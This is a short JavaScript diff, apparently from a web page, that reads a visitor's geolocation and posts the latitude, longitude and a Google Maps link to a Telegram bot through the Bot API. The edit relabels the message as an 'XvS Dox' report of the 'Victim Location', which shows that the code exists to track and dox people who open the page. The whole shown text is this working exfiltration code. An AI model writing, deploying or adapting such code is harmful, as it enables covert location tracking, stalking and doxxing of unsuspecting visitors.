@@ -95,10 +95,10 @@
           const latitude = position.coords.latitude;  
           const longitude = position.coords.longitude;  
 
-          const message = `📍 Lokasi Visitor:\n` +  
-                          `Latitude: ${latitude}\n` +  
-                          `Longitude: ${longitude}\n` +  
-                          `Google Maps: https://www.google.com/maps?q=${latitude},${longitude}`;  
+          const message = `【﻿ＸｖＳ　Ｄｏｘ】\n🖥️Victim Location:\n` +  
+                          `\n🟢Latitude: ${latitude}\n` +  
+                          `🟢Longitude: ${longitude}\n` +  
+                          `🟢Google Maps: https://www.google.com/maps?q=${latitude},${longitude}`;  
 
           await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {  
             method: "POST",  
